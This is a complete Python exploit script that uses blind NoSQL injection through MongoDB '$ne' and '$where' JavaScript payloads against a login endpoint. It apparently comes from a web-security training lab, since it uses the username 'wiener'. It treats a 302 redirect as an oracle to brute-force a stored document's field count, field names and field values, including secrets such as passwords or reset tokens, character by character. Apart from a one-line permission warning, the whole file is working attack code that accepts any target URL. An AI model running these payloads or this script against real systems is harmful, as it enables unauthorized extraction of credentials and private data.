#!/usr/bin/python3

"""
MongoDB Fields Enumeration via NoSQL Injection
WARNING: Use only on systems you own or have explicit permission to test
"""

from pwn import *
import requests, signal, time, pdb, sys, string, argparse, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def def_handler(sig, frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def test_field_count(url, field_count, proxy_url=None):
    """
    Test if the document has a specific number of fields
    
    Args:
        url: Target URL
        field_count: Number of fields to test
        proxy_url: Optional proxy URL
    
    Returns:
        True if the field count matches, False otherwise
    """
    payload = {
        "username": "wiener",
        "password": {
            "$ne": ""
        },
        "$where": f"function(){{ if(Object.keys(this).length=={field_count}) return 1; else return 0; }}"
    }
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    proxies = None
    if proxy_url:
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
    
    try:
        response = requests.post(
            url,
            json=payload,
            headers=headers,
            proxies=proxies,
            verify=False,
            timeout=300,
            allow_redirects=False
        )
        
        if response.status_code == 302:
            return True
        
        return False
        
    except requests.exceptions.RequestException as e:
        log.error(f"Error during request: {e}")
        return False

def test_field_length(url, field_index, length, proxy_url=None):
    """
    Test if a specific field has a specific length
    
    Args:
        url: Target URL
        field_index: Index of the field to test (0-based)
        length: Length to test
        proxy_url: Optional proxy URL
    
    Returns:
        True if the field length matches, False otherwise
    """
    payload = {
        "username": "wiener",
        "password": {
            "$ne": ""
        },
        "$where": f"function(){{ if(Object.keys(this)[{field_index}].length=={length}) return 1; else return 0; }}"
    }
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    proxies = None
    if proxy_url:
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
    
    try:
        response = requests.post(
            url,
            json=payload,
            headers=headers,
            proxies=proxies,
            verify=False,
            timeout=300,
            allow_redirects=False
        )
        
        if response.status_code == 302:
            return True
        
        return False
        
    except requests.exceptions.RequestException as e:
        log.error(f"Error during request: {e}")
        return False


def test_field_value_length(url, field_name, length, proxy_url=None):
    """
    Test if a field's value has a specific length
    
    Args:
        url: Target URL
        field_name: Name of the field to test
        length: Length to test
        proxy_url: Optional proxy URL
    
    Returns:
        True if the value length matches, False otherwise
    """
    payload = {
        "username": "wiener",
        "password": {
            "$ne": ""
        },
        "$where": f"function(){{ if(this.{field_name}.valueOf().toString().length == {length}) return 1; else return 0; }}"
    }
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    proxies = None
    if proxy_url:
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
    
    try:
        response = requests.post(
            url,
            json=payload,
            headers=headers,
            proxies=proxies,
            verify=False,
            timeout=300,
            allow_redirects=False
        )
        
        if response.status_code == 302:
            return True
        
        return False
        
    except requests.exceptions.RequestException as e:
        log.error(f"Error during request: {e}")
        return False

def enumerate_field_lengths(url, field_count, proxy_url=None):
    """
    Enumerate the length of each field in the document
    
    Args:
        url: Target URL
        field_count: Total number of fields
        proxy_url: Optional proxy URL
    
    Returns:
        List with field lengths
    """
    field_lengths = []
    
    p2 = log.progress("Enumerating field lengths")
    
    for field_index in range(field_count):
        p2.status(f"Testing field {field_index}/{field_count-1}")
        length = 0  # Start from 0 to include empty strings
        found = False
        
        while not found:
            if test_field_length(url, field_index, length, proxy_url):
                log.success(f"✓ Field {field_index} has length: {length}")
                field_lengths.append(length)
                found = True
            else:
                length += 1
                
            # Safety limit to prevent infinite loop
            if length > 200:
                log.warning(f"Length exceeds 200 for field {field_index}, skipping...")
                field_lengths.append(None)
                break
    
    p2.success("Field lengths enumeration completed")
    return field_lengths

def enumerate_field_value_lengths(url, field_names, proxy_url=None):
    """
    Enumerate the length of each field's value
    
    Args:
        url: Target URL
        field_names: List of field names
        proxy_url: Optional proxy URL
    
    Returns:
        Dictionary with field names and their value lengths
    """
    field_value_lengths = {}
    
    p4 = log.progress("Enumerating field value lengths")
    
    for field_name in field_names:
        if field_name is None:
            log.warning(f"Skipping field (invalid name)")
            field_value_lengths[field_name] = None
            continue
        
        p4.status(f"Testing field '{field_name}'")
        length = 0  # Start from 0 to include empty strings
        found = False
        
        while not found:
            p4.status(f"Field '{field_name}' - Testing length: {length}")
            
            if test_field_value_length(url, field_name, length, proxy_url):
                log.success(f"✓ Field '{field_name}' value length: {length}")
                field_value_lengths[field_name] = length
                found = True
            else:
                length += 1
                
            # Safety limit to prevent infinite loop
            if length > 200:
                log.warning(f"Length exceeds 200 for field '{field_name}', skipping...")
                field_value_lengths[field_name] = None
                break
    
    p4.success("Field value lengths enumeration completed")
    return field_value_lengths

def enumerate_field_values(url, field_names, field_value_lengths, proxy_url=None):
    """
    Enumerate the actual value of each field
    
    Args:
        url: Target URL
        field_names: List of field names
        field_value_lengths: Dictionary with field names and their value lengths
        proxy_url: Optional proxy URL
    
    Returns:
        Dictionary with field names and their values
    """
    # Character set for brute forcing
    characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
    
    field_values = {}
    
    p5 = log.progress("Enumerating field values")
    
    for field_name in field_names:
        if field_name is None:
            log.warning(f"Skipping field (invalid name)")
            field_values[field_name] = None
            continue
        
        value_length = field_value_lengths.get(field_name)
        if value_length is None or value_length == 0:
            log.warning(f"Skipping field '{field_name}' (invalid value length)")
            field_values[field_name] = None
            continue
        
        p5.status(f"Extracting value for field '{field_name}' (length: {value_length})")
        field_value = ""
        
        for position in range(value_length):
            found_char = None
            
            for character in characters:
                p5.status(f"Field '{field_name}' - Position {position}/{value_length-1}: Testing '{character}' - Current: '{field_value}'")
                
                # Escape special regex characters ONLY for the regex pattern
                escaped_char = character
                if character == '\\':
                    # Backslash needs 8 backslashes total (7 + 1)
                    escaped_char = '\\\\\\\\\\\\\\\\'
                elif character in '.^$*+?{}[]|()':
                    escaped_char = '\\\\' + character
                
                # Create payload with escaped character
                payload = {
                    "username": "wiener",
                    "password": {
                        "$ne": ""
                    },
                    "$where": f"function(){{ if(this.{field_name}.valueOf().toString().match('^.{{{position}}}{escaped_char}.*')) return 1; else return 0; }}"
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                
                proxies = None
                if proxy_url:
                    proxies = {
                        'http': proxy_url,
                        'https': proxy_url
                    }
                
                try:
                    response = requests.post(
                        url,
                        json=payload,
                        headers=headers,
                        proxies=proxies,
                        verify=False,
                        timeout=300,
                        allow_redirects=False
                    )
                    
                    if response.status_code == 302:
                        # Add the ORIGINAL character (not escaped) to field_value
                        field_value += character
                        found_char = character
                        break
                        
                except requests.exceptions.RequestException as e:
                    log.error(f"Error during request: {e}")
            
            if found_char is None:
                log.warning(f"Could not find character at position {position} for field '{field_name}'")
                field_value += "?"
        
        log.success(f"✓ Field '{field_name}' complete: '{field_value}'")
        field_values[field_name] = field_value
    
    p5.success("Field values enumeration completed")
    return field_values

def enumerate_field_names(url, field_lengths, proxy_url=None):
    """
    Enumerate the actual name of each field
    
    Args:
        url: Target URL
        field_lengths: List of field lengths
        proxy_url: Optional proxy URL
    
    Returns:
        List with field names
    """
    # Character set for brute forcing
    characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
    
    field_names = []
    
    p3 = log.progress("Enumerating field names")
    
    for field_index, length in enumerate(field_lengths):
        if length is None or length == 0:
            log.warning(f"Skipping field {field_index} (invalid length)")
            field_names.append(None)
            continue
        
        p3.status(f"Extracting field {field_index}/{len(field_lengths)-1} (length: {length})")
        field_name = ""
        
        for position in range(length):
            found_char = None
            
            for character in characters:
                p3.status(f"Field {field_index} - Position {position}/{length-1}: Testing '{character}' - Current: '{field_name}'")
                
                # Escape special regex characters ONLY for the regex pattern
                escaped_char = character
                if character == '\\':
                    # Backslash needs 8 backslashes total (7 + 1)
                    escaped_char = '\\\\\\\\\\\\\\\\'
                elif character in '.^$*+?{}[]|()':
                    escaped_char = '\\\\' + character
                
                # Create payload with escaped character
                payload = {
                    "username": "wiener",
                    "password": {
                        "$ne": ""
                    },
                    "$where": f"function(){{ if(Object.keys(this)[{field_index}].match('^.{{{position}}}{escaped_char}.*')) return 1; else return 0; }}"
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                
                proxies = None
                if proxy_url:
                    proxies = {
                        'http': proxy_url,
                        'https': proxy_url
                    }
                
                try:
                    response = requests.post(
                        url,
                        json=payload,
                        headers=headers,
                        proxies=proxies,
                        verify=False,
                        timeout=300,
                        allow_redirects=False
                    )
                    
                    if response.status_code == 302:
                        # Add the ORIGINAL character (not escaped) to field_name
                        field_name += character
                        found_char = character
                        break
                        
                except requests.exceptions.RequestException as e:
                    log.error(f"Error during request: {e}")
            
            if found_char is None:
                log.warning(f"Could not find character at position {position} for field {field_index}")
                field_name += "?"
        
        log.success(f"✓ Field {field_index} complete: '{field_name}'")
        field_names.append(field_name)
    
    p3.success("Field names enumeration completed")
    return field_names

def makeRequest(url, proxy_url=None, output_file='fields.txt'):
    """
    Enumerate the number of fields, their lengths, and their names in MongoDB document
    
    Args:
        url: Target URL
        proxy_url: Optional proxy URL
        output_file: File to save results
    """
    log.info("MongoDB Fields Enumeration Tool")
    log.info(f"Target URL: {url}")
    if proxy_url:
        log.info(f"Using proxy: {proxy_url}")
    
    # Step 1: Find the number of fields
    p1 = log.progress("Enumerating field count")
    p1.status("Starting brute-force attack")
    found_count = None
    
    for count in range(1, 21):
        p1.status(f"Testing field count: {count}")
        
        if test_field_count(url, count, proxy_url):
            found_count = count
            p1.success(f"Document has {count} fields")
            log.success(f"✓ Field count found: {count}")
            break
    
    if found_count is None:
        p1.failure("No matching field count found in range 1-20")
        log.error("Try increasing the range or check your payload")
        return
    
    # Step 2: Find the length of each field
    field_lengths = enumerate_field_lengths(url, found_count, proxy_url)
    
    # Step 3: Extract the name of each field
    field_names = enumerate_field_names(url, field_lengths, proxy_url)
    
    # Step 4: Extract the length of each field's value
    print("\n[*] Step 4: Enumerating field value lengths...")
    field_value_lengths = enumerate_field_value_lengths(url, field_names, proxy_url)
    
    # Step 5: Extract the actual value of each field
    print("\n[*] Step 5: Enumerating field values...")
    field_values = enumerate_field_values(url, field_names, field_value_lengths, proxy_url)
    
    # Display results
    log.info("="*50)
    log.info("RESULTS:")
    log.info("="*50)
    log.info(f"Total fields: {found_count}")
    for field_idx in range(len(field_names)):
        length = field_lengths[field_idx]
        name = field_names[field_idx]
        value_length = field_value_lengths.get(name, None)
        value = field_values.get(name, None)
        if name is not None:
            log.info(f"Field {field_idx}: '{name}' = '{value}'")
        else:
            log.warning(f"Field {field_idx}: Could not be determined")
    
    # Save results
    with open(output_file, 'w') as f:
        f.write(f"Total fields: {found_count}\n")
        f.write("-"*50 + "\n")
        for field_idx in range(len(field_names)):
            length = field_lengths[field_idx]
            name = field_names[field_idx]
            value_length = field_value_lengths.get(name, None)
            value = field_values.get(name, None)
            if name is not None:
                f.write(f"Field {field_idx}: '{name}' = '{value}'\n")
            else:
                f.write(f"Field {field_idx}: Could not be determined\n")
    
    log.success(f"Results saved to: {output_file}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='MongoDB Fields Enumeration via NoSQL Injection',
        add_help=False
    )
    parser.add_argument('-h', '--help', action='help', help='Show this help message and exit')
    parser.add_argument('-u', '--url', required=True, metavar='', help='Target URL (e.g. https://example.com/login)')
    parser.add_argument('-p', '--proxy', metavar='', help='Proxy URL (e.g. http://127.0.0.1:8080)')
    parser.add_argument('-o', '--output', default='fields.txt', metavar='', help='Output file (default: fields.txt)')
    
    args = parser.parse_args()
    
    makeRequest(url=args.url, proxy_url=args.proxy, output_file=args.output)
